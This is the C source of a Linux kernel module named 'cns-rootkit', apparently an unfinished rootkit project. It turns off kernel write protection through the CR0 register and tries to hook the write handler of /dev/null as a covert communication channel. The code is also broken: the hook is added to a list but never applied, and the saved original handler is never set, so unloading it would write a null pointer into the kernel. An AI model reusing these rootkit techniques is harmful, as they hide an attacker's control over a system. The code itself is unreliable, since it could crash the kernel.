#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>

#define DISABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_disable(); \
        write_cr0(read_cr0() & (~ 0x10000)); \
    } while (0);
#define ENABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_enable(); \
        write_cr0(read_cr0() | 0x10000); \
    } while (0);

MODULE_LICENSE("MIT");
MODULE_AUTHOR("SAV");

struct hook {
  void *original_function;
  void *modified_function;
  void **modified_at;
  struct list_head list;
};

LIST_HEAD(hook_list);

void hook_add(void **modified_at, void *modified_function) {
  struct hook *h = kmalloc(sizeof(struct hook), GFP_KERNEL);
  if(!h) {
    return ;
  }

  h->modified_at = modified_at;
  h->modified_function = modified_function;
  h->original_function = (void *) (*modified_at);
  list_add(&h->list, &hook_list);
}

void hook_patch(void *modified_function) {
  struct hook *h;

  list_for_each_entry(h, &hook_list, list) {
    if(h->modified_function == modified_function) {
      DISABLE_W_PROTECTED_MEMORY
      *(h->modified_at) = h->modified_function;
      ENABLE_W_PROTECTED_MEMORY
      break;
    }
  }
}

void hook_unpatch(void *modified_function) {
  struct hook *h;

  list_for_each_entry(h, &hook_list, list) {
    if(h->modified_function == modified_function) {
      DISABLE_W_PROTECTED_MEMORY
      *(h->modified_at) = h->original_function;
      ENABLE_W_PROTECTED_MEMORY
      break;
    }
  }
}

/*int hook_remove_all() {

}*/

int establish_comm_channel(void);
int unestablish_comm_channel(void);

ssize_t cns_rootkit_dev_null_write(struct file *, char __user *, size_t, loff_t *);


ssize_t (*original_dev_null_write) (struct file *, char __user *, size_t, loff_t *);

ssize_t cns_rootkit_dev_null_write(struct file *filep, char __user *buf, size_t count, loff_t *p) {
  printk(KERN_INFO "cns-rootkit: In my /dev/null write\n");
  unestablish_comm_channel();
  ssize_t res =  original_dev_null_write(filep, buf, count, p);
  establish_comm_channel();

  return res;
}

int establish_comm_channel(void) {
  printk(KERN_INFO "cns-rootkit: Attempting to establish communication channel\n");
  struct file *dev_null_file;
  if((dev_null_file = filp_open("/dev/null", O_RDONLY, 0)) == NULL) {
    return -1;
  }
  printk(KERN_INFO "cns-rootkit: Opened /dev/null for reading\n");
  struct file_operations *dev_null_fop;
  dev_null_fop = (struct file_operations *) dev_null_file->f_op;
  filp_close(dev_null_file, 0);
  printk(KERN_INFO "cns-rootkit: Got file_operations structure and closed /dev/null\n");
  /*
  original_dev_null_write = dev_null_fop->write;
  DISABLE_W_PROTECTED_MEMORY
  dev_null_fop->write = cns_rootkit_dev_null_write;
  ENABLE_W_PROTECTED_MEMORY
  */

  hook_add((void **)(&(dev_null_fop->write)), (void *)cns_rootkit_dev_null_write);

  printk(KERN_INFO "cns-rootkit: Successfully established communication channel\n");
  return 0;
}

int unestablish_comm_channel(void) {
  printk(KERN_INFO "cns-rootkit: Attempting to unestablish communication channel\n");
  struct file *dev_null_file;
  if((dev_null_file = filp_open("/dev/null", O_RDONLY, 0)) == NULL) {
    return -1;
  }

  struct file_operations *dev_null_fop;
  dev_null_fop = (struct file_operations *) dev_null_file->f_op;
  filp_close(dev_null_file, 0);
  DISABLE_W_PROTECTED_MEMORY
  dev_null_fop->write = original_dev_null_write;
  ENABLE_W_PROTECTED_MEMORY
  printk(KERN_INFO "cns-rootkit: Successfully unestablished communication channel\n");
  return 0;
}

static int cns_rootkit_init(void) {
  printk(KERN_INFO "cns-rootkit: Init\n");

  if(establish_comm_channel() < 0) {
    printk(KERN_INFO "cns-rootkit: Failed to establish communication channel\n");
  }
  return 0;
}

static void cns_rootkit_exit(void) {
  printk(KERN_INFO "cns-rootkit: Exit\n");
}

module_init(cns_rootkit_init);
module_exit(cns_rootkit_exit);
